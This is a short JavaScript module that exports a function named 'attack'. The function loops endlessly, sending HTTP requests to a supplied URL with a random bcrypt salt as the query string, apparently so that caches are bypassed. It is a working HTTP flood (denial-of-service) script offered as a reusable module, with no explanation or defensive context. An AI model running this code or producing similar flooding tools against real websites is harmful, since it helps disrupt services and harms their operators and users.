const fetch = require("node-fetch");
const bcrypt = require("bcryptjs");
async function attack(url) {
	do {
		await fetch(`${url}?${bcrypt.genSaltSync(10)}`);
		await fetch(`${url}?${bcrypt.genSaltSync(10)}`);
		await fetch(`${url}?${bcrypt.genSaltSync(10)}`);
		await fetch(`${url}?${bcrypt.genSaltSync(10)}`);
		await fetch(`${url}?${bcrypt.genSaltSync(10)}`);
		await fetch(`${url}?${bcrypt.genSaltSync(10)}`);
		await fetch(`${url}?${bcrypt.genSaltSync(10)}`);
		await fetch(`${url}?${bcrypt.genSaltSync(10)}`);
		await fetch(`${url}?${bcrypt.genSaltSync(10)}`);
		await fetch(`${url}?${bcrypt.genSaltSync(10)}`);
	}
	while (true)
}
module.exports = attack;